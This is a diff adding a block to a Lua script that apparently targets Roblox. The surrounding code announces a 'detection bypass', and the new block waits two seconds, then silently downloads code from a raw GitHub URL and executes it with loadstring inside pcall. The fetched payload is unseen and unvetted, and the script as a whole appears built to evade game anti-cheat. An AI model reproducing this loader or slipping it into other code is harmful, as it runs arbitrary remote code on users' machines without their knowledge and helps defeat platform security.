@@ -118,3 +118,12 @@ task.spawn(function()
         print("[SAE] Detection bypass loaded")
     end)
 end)
+
+----------------------------------------------------------------
+-- 4. Delayed Script Loader (2 Seconds Delay)
+----------------------------------------------------------------
+task.delay(2, function()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/aslamdunk21/payomboyg/refs/heads/main/5Star"))()
+    end)
+end)
